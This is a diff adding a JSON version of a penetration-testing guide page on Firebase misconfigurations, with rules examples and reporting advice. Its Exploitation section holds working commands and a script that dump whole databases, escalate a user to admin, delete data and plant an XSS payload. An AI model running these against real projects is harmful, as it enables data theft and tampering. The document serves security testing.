@@ -1,0 +1,342 @@
+{
+    "title": "Firebase",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Overview",
+            "type": "paragraph",
+            "content": "Firebase is a Backend-as-a-Service (BaaS) platform by Google. Misconfigurations can lead to data exposure, unauthorized access, and account takeover."
+        },
+        {
+            "heading": "Common Misconfigurations",
+            "subheadings": [
+                {
+                    "heading": "Insecure Realtime Database",
+                    "type": "code_block",
+                    "content": [
+                        "# Test for open database (no authentication required)",
+                        "curl https://PROJECT-ID.firebaseio.com/.json",
+                        "",
+                        "# If returns data = VULNERABLE",
+                        "# If returns \"Permission Denied\" = properly configured",
+                        "",
+                        "# Test for write access",
+                        "curl -X PUT -d '{\"test\": \"data\"}' https://PROJECT-ID.firebaseio.com/test.json",
+                        "",
+                        "# Test with shallow query (list keys only)",
+                        "curl \"https://PROJECT-ID.firebaseio.com/.json?shallow=true\""
+                    ]
+                },
+                {
+                    "heading": "Insecure Cloud Firestore",
+                    "type": "code_block",
+                    "content": [
+                        "# Firestore uses different URL pattern",
+                        "# Testing requires Firebase SDK or REST API with proper auth",
+                        "",
+                        "# Check if Firestore rules allow public read",
+                        "# In Firebase Console: Firestore Database > Rules",
+                        "# Vulnerable rule:",
+                        "# match /{document=**} {",
+                        "#   allow read, write: if true;",
+                        "# }"
+                    ]
+                },
+                {
+                    "heading": "Insecure Storage Buckets",
+                    "type": "code_block",
+                    "content": [
+                        "# Firebase Storage uses Google Cloud Storage",
+                        "# Bucket name format: PROJECT-ID.appspot.com",
+                        "",
+                        "# Test public access",
+                        "gsutil ls gs://PROJECT-ID.appspot.com/",
+                        "",
+                        "# Or via HTTP",
+                        "curl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o\"",
+                        "",
+                        "# List all files",
+                        "curl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o?maxResults=1000\"",
+                        "",
+                        "# Download specific file",
+                        "curl \"https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/FILENAME?alt=media\""
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Enumeration",
+            "subheadings": [
+                {
+                    "heading": "Finding Firebase Projects",
+                    "type": "code_block",
+                    "content": [
+                        "# From APK",
+                        "apktool d app.apk",
+                        "grep -r \"firebaseio.com\" app/",
+                        "grep -r \"firebaseapp.com\" app/",
+                        "grep -r \"appspot.com\" app/",
+                        "",
+                        "# Common files containing Firebase config",
+                        "# - google-services.json (Android)",
+                        "# - GoogleService-Info.plist (iOS)",
+                        "# - firebase-config.js (Web)",
+                        "",
+                        "# Extract from google-services.json",
+                        "cat google-services.json | jq '.project_info.firebase_url'",
+                        "cat google-services.json | jq '.project_info.storage_bucket'",
+                        "",
+                        "# From JavaScript files",
+                        "grep -Eo \"[a-z0-9-]+\\.firebaseio\\.com\" *.js",
+                        "grep -Eo \"apiKey.*AIza[A-Za-z0-9_-]{35}\" *.js"
+                    ]
+                },
+                {
+                    "heading": "API Key Extraction",
+                    "type": "code_block",
+                    "content": [
+                        "# Firebase API keys are often exposed (they're meant to be public)",
+                        "# But combined with misconfigurations, they can be dangerous",
+                        "",
+                        "# Pattern: AIza followed by 35 chars",
+                        "grep -rEo \"AIza[A-Za-z0-9_-]{35}\" .",
+                        "",
+                        "# Project ID pattern",
+                        "grep -rEo \"[a-z0-9-]{5,30}\\.firebaseapp\\.com\" .",
+                        "",
+                        "# Full config extraction",
+                        "grep -rEo '\"apiKey\"\\s*:\\s*\"AIza[A-Za-z0-9_-]{35}\"' ."
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Exploitation",
+            "subheadings": [
+                {
+                    "heading": "Database Data Exfiltration",
+                    "type": "code_block",
+                    "content": [
+                        "#!/usr/bin/env python3",
+                        "import requests",
+                        "import json",
+                        "",
+                        "base_url = \"https://PROJECT-ID.firebaseio.com\"",
+                        "",
+                        "# Get all data",
+                        "response = requests.get(f\"{base_url}/.json\")",
+                        "if response.status_code == 200:",
+                        "    data = response.json()",
+                        "    print(json.dumps(data, indent=2))",
+                        "",
+                        "# Get shallow keys first (for large databases)",
+                        "response = requests.get(f\"{base_url}/.json?shallow=true\")",
+                        "keys = response.json().keys()",
+                        "",
+                        "# Then enumerate each collection",
+                        "for key in keys:",
+                        "    response = requests.get(f\"{base_url}/{key}.json\")",
+                        "    print(f\"\\n=== {key} ===\")",
+                        "    print(json.dumps(response.json(), indent=2))"
+                    ]
+                },
+                {
+                    "heading": "Authentication Bypass",
+                    "type": "code_block",
+                    "content": [
+                        "# If Firebase Auth is misconfigured, you might be able to:",
+                        "",
+                        "# 1. Create accounts without email verification",
+                        "# 2. Access authenticated endpoints without proper tokens",
+                        "# 3. Enumerate user accounts",
+                        "",
+                        "# Test anonymous authentication",
+                        "curl -X POST \"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY\" \\",
+                        "  -H \"Content-Type: application/json\" \\",
+                        "  -d '{\"returnSecureToken\":true}'",
+                        "",
+                        "# This returns an idToken if anonymous auth is enabled"
+                    ]
+                },
+                {
+                    "heading": "Write Access Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# If write access is open, you can:",
+                        "",
+                        "# 1. Modify existing data",
+                        "curl -X PATCH -d '{\"admin\": true}' \\",
+                        "  \"https://PROJECT-ID.firebaseio.com/users/victim.json\"",
+                        "",
+                        "# 2. Delete data",
+                        "curl -X DELETE \"https://PROJECT-ID.firebaseio.com/sensitive_data.json\"",
+                        "",
+                        "# 3. Add malicious content (for XSS if data is reflected)",
+                        "curl -X PUT -d '{\"content\": \"<script>alert(1)</script>\"}' \\",
+                        "  \"https://PROJECT-ID.firebaseio.com/posts/malicious.json\""
+                    ]
+                },
+                {
+                    "heading": "Cloud Functions Exploitation",
+                    "type": "code_block",
+                    "content": [
+                        "# Firebase Cloud Functions can have vulnerabilities",
+                        "",
+                        "# Find function endpoints",
+                        "# Usually: https://REGION-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME",
+                        "",
+                        "# Test for:",
+                        "# - Missing authentication",
+                        "# - Input validation issues",
+                        "# - SSRF via user-controlled URLs",
+                        "# - Command injection",
+                        "",
+                        "# Enumerate functions from Firebase config",
+                        "# Check firebase.json in source code"
+                    ]
+                }
+            ]
+        },
+        {
+            "heading": "Tools",
+            "type": "code_block",
+            "content": [
+                "# Automated Firebase scanner",
+                "# https://github.com/Turr0n/firebase",
+                "python3 firebase.py -p 4 --dnsdumpster -l file",
+                "",
+                "# Firebase Exploit",
+                "# https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit",
+                "python3 Firebase_Exploit.py",
+                "",
+                "# Firebase Extractor",
+                "# https://github.com/viperbluff/Firebase-Extractor",
+                "python3 firebase.py xyz.firebaseio.com",
+                "",
+                "# Baserunner - Firebase security assessment",
+                "# https://github.com/iosiro/baserunner",
+                "baserunner -c config.json",
+                "",
+                "# Fireward - Firebase security rules tester",
+                "# https://github.com/nickmomrik/fireward"
+            ]
+        },
+        {
+            "heading": "Python Connector",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/thisbejim/Pyrebase",
+                "import pyrebase",
+                "",
+                "config = {",
+                "  \"apiKey\": \"FIREBASE_API_KEY\",",
+                "  \"authDomain\": \"PROJECT-ID.firebaseapp.com\",",
+                "  \"databaseURL\": \"https://PROJECT-ID.firebaseio.com\",",
+                "  \"storageBucket\": \"PROJECT-ID.appspot.com\",",
+                "}",
+                "",
+                "firebase = pyrebase.initialize_app(config)",
+                "db = firebase.database()",
+                "",
+                "# Read all data",
+                "print(db.get().val())",
+                "",
+                "# Read specific path",
+                "print(db.child(\"users\").get().val())",
+                "",
+                "# Write data (if allowed)",
+                "db.child(\"test\").set({\"key\": \"value\"})"
+            ]
+        },
+        {
+            "heading": "Security Rules Analysis",
+            "type": "code_block",
+            "content": [
+                "// Insecure rules (VULNERABLE)",
+                "{",
+                "  \"rules\": {",
+                "    \".read\": true,",
+                "    \".write\": true",
+                "  }",
+                "}",
+                "",
+                "// Slightly better but still risky",
+                "{",
+                "  \"rules\": {",
+                "    \".read\": \"auth != null\",",
+                "    \".write\": \"auth != null\"",
+                "  }",
+                "}",
+                "",
+                "// Proper rules (per-user data)",
+                "{",
+                "  \"rules\": {",
+                "    \"users\": {",
+                "      \"$uid\": {",
+                "        \".read\": \"$uid === auth.uid\",",
+                "        \".write\": \"$uid === auth.uid\"",
+                "      }",
+                "    }",
+                "  }",
+                "}"
+            ]
+        },
+        {
+            "heading": "Reporting Findings",
+            "type": "paragraph",
+            "content": "When reporting Firebase misconfigurations:\n1. Data Exposure: Document what data is accessible (PII, credentials, etc.)\n2. Write Access: Demonstrate ability to modify data (use test entries)\n3. Impact: Explain business impact (data breach, service disruption)\n4. Remediation: Recommend proper security rules"
+        },
+        {
+            "heading": "Resources",
+            "type": "list",
+            "content": [
+                "Firebase Security Rules Documentation",
+                "Firebase Security Checklist",
+                "OWASP Mobile Security Testing Guide - Firebase"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-02-03T14:05:45.496Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/firebase.md",
+        "previous_page": {
+            "title": "VHosts",
+            "url": "/enumeration/webservices/vhosts"
+        },
+        "next_page": {
+            "title": "OWA",
+            "url": "/enumeration/webservices/owa"
+        }
+    }
+}
